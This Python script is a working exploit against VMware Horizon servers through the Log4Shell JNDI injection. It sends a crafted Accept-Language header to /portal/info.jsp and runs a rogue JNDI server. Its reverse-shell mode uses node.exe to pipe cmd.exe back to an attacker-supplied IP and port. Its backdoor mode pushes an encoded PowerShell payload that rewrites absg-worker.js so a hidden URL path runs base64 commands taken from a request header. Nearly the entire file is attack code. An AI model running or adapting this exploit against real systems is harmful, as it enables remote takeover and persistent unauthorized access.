import argparse
from urllib.parse import urlparse
import requests
from base64 import b64encode
import subprocess
import time
import os.path
import random
import string
from string import Template
import socket

# Dealing with SSL Warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# Defining arguments
def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--url", dest="url", help="VMWare Horizon target IP", action='store', required=True)
    parser.add_argument("-i", "--ip", dest="callback", help="Callback IP for payload delivery.", action='store', required=True)
    parser.add_argument("-p", "--port", dest="port", help="Callback port for reverse shell.", action='store', required=False)
    parser.add_argument("-r", "--revshell", dest="shell", help="Module to establish reverse shell", action='store_true', required=False)
    parser.add_argument("-b", "--backdoor", dest="backdoor", help="Module to add backdoor", action='store_true', required=False)

    args = parser.parse_args()

    # Making sure port specified for reverse shell payload
    if not args.port and args.shell == True:
        print('[!] You did not specify a port. Re-run command with -p flag.')
        exit()
    else:
        pass

    # Making sure RogueJNDI exists on disk
    if os.path.exists('./utils/rogue-jndi/target/RogueJndi-1.1.jar') == True:
        pass 
    else:
        print('[!] You have not compiled RogueJNDI.')
        print('[!] See README.md for more information.')
        exit()

    # Making sure a real module was specified by the user
    if args.backdoor== True:
        print('[*] Implementing backdoor now...')
    elif args.shell == True:
        print(f'[*] Make sure an listener is started: ncat -lvnp {args.port}')
        print('[*] Reverse shell payload executing now.')
    else:
        print('[!] You did not specify a valid module!')
        exit()

    return args.url, args.callback, args.port, args.shell, args.backdoor


def backdoorit(url, callback):


    # Building our URL
    endpoint = f'https://{url}/portal/info.jsp'
    
    # Crafting our payload and headers
    # Includes unique User-Agent header for defenders to monitor for
    header = {
        'Accept-Language': f'${{jndi:ldap://{callback}:1389/o=tomcat}}',
        'User-Agent': 'Mozilla/5.0 ((63bf99fa-475d-4e0a-930b-a5f694d4992d))'
    }
    
    # Generating random URL path and HTTP header for backdoor
    url_path = ''.join(random.choices(string.ascii_lowercase, k = 25))
    payload_header = ''.join(random.choices(string.ascii_lowercase, k = 5))
    
    # If someone can figure out why this doesn't work i'll paypal you $20 USD
    #backdoor = '''$path=gwmi win32_service|?{$_.Name -like "*PCOI*"}|%{$_.PathName -replace '"', '' -replace "bin\SecurityGateway.exe","appblastgateway\lib\\absg-worker.js"};$expr="req.connection.end();`r`n`t`t`t}`r`n`r`n`t`t`tif (String(req.url).includes('URL_PATH')) {`r`n`t`t`t`ttry {`r`n`t`t`t`t`treplyError(req, res, 200, require('child_process').execSync(`r`n`t`t`t`t`t`tBuffer.from(req.headers['HEADER'], 'base64').toString('ascii')`r`n`t`t`t`t`t).toString());`r`n`t`t`t`t}`r`n`t`t`t`tcatch (err) {`r`n`t`t`t`t`treplyError(req, res, 400, err.stderr.toString());`r`n`t`t`t`t}`r`n`t`t`t`treturn;";(Get-Content $path)|ForEach-Object {$_ -replace "req.connection.end\(\)\;", $expr}|Set-Content $path;$nssm=gwmi win32_service|?{$_.Name -like "*PCOI*"}|%{$_.PathName -replace '"', '' -replace "bin\SecurityGateway.exe","appblastgateway\\nssm.exe"};cmd.exe /C $nssm restart VMBlastSG'''


    # Defining our payload to push the backdoor into absg-worker.js
    backdoor = '''$path="C:\Program Files\VMware\VMware View\Server\\appblastgateway\lib\\absg-worker.js";$expr="req.connection.end();`r`n`t`t`t}`r`n`r`n`t`t`tif (String(req.url).includes('URL_PATH')) {`r`n`t`t`t`ttry {`r`n`t`t`t`t`treplyError(req, res, 200, require('child_process').execSync(`r`n`t`t`t`t`t`tBuffer.from(req.headers['HEADER'], 'base64').toString('ascii')`r`n`t`t`t`t`t).toString());`r`n`t`t`t`t}`r`n`t`t`t`tcatch (err) {`r`n`t`t`t`t`treplyError(req, res, 400, err.stderr.toString());`r`n`t`t`t`t}`r`n`t`t`t`treturn;";(Get-Content $path)|ForEach-Object {$_ -replace "req.connection.end\(\)\;", $expr}|Set-Content $path;Restart-Service -Force VMBlastSG'''

    # Inserting random header and URL path into payload above
    header_replace = backdoor.replace('HEADER', payload_header)
    url_replace = header_replace.replace('URL_PATH', url_path)

    # Doing goofy encoding stuff for our PowerShell command 
    # https://dariuszparys.github.io/posts/powershell-encodedcommand-from-bash-and-python/
    encoded_bytes = b64encode(url_replace.encode('utf-16-le'))
    encoded_string = str(encoded_bytes, 'utf-8') 

    # Starting rogue-jndi
    print('[*] Starting malicous JNDI Server')
    proc = subprocess.Popen(['timeout', '25s', 'java', '-jar', './utils/rogue-jndi/target/RogueJndi-1.1.jar', '--command', f'cmd.exe /c powershell -encodedcommand {encoded_string}', '--hostname', f'{callback}'],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

    
    # Sleeping for five seconds to prevent issues
    time.sleep(5)

    ## Issuing request
    print('[*] Firing payload!\n')
    response = requests.get(endpoint, headers=header, verify=False)

    # Seeing if VMBlastSG started successfully
    # It doesn't matter what path we request so just checking /verify
    print('[*] Checking to see if the VMBlastSG service started.')
    print('[*] This can take up to 15 seconds.')
    check = requests.get(f'https://{url}:8443/verify', verify=False, timeout=15)
    
    # Telling user if 8443 opened on the host (assuming VMBlastSG wasn't already running
    if check.status_code == 404:
       print('[*] Exploit successful!')
       print(f'[*] Your backdoors path is: https://{url}:8443/{url_path}')
       print(f'[*] Your backdoors header is: {payload_header}')
       print(f'[*] Windows commands need to be Base64 encoded and issued in a cURL request similar to the one below:')

       # Base64 value is literally cmd.exe /c calc.exe
       print(f'[*] curl -ski -H "{payload_header}: Y21kLmV4ZSAvYyBjYWxjLmV4ZQo=" https://{url}:8443/{url_path}')
    else: 
       print(f'[!] Exploit failed! VMBlastSG service not successfully started or good firewall rules are in place.')
       print(f'[!] Good luck next time!')


def revshell(url, callback, port):
    
    # Building our URL
    endpoint = f'https://{url}/portal/info.jsp'

    # Crafting our headers
    # Includes unique User-Agent header for defenders to monitor for
    header = {
        'Accept-Language': f'${{jndi:ldap://{callback}:1389/o=tomcat}}',
        'User-Agent': 'Mozilla/5.0 (d7266c81-4480-4995-919d-23c9e2193e95)'
    }

    # Crafting our reverse shell payload
    # Using the build in node.exe and assuming it's in the same path everytime. Should probably dynamically resolve this somehow.
    payload = '''"C:\Program Files\VMware\VMware View\Server\\appblastgateway\\node.exe" -r net -e "sh = require('child_process').exec('cmd.exe');var client = new net.Socket();client.connect(PORT, 'IP', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"'''

    # Replacing variables in the command above for the reverse shell
    port_replace = payload.replace('PORT', port)
    ip_replace = port_replace.replace('IP', callback)

    # Starting rogue-jndi
    print('[*] Starting malicous JNDI Server')
    proc = subprocess.Popen(['timeout', '25s', 'java', '-jar', './utils/rogue-jndi/target/RogueJndi-1.1.jar', '--command', f'{ip_replace}', '--hostname', f'{callback}'],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

    # Sleeping for five seconds to prevent issues
    time.sleep(5)

    ## Issuing request
    print('[*] Firing payload!\n')
    response = requests.get(endpoint, headers=header, verify=False)

    print('[*] Check for a callback!')


url, callback, port, shell, backdoor = args()

# Picking what we are going to do
if backdoor is True:
   backdoorit(url, callback)

elif shell is True:
   revshell(url, callback, port)
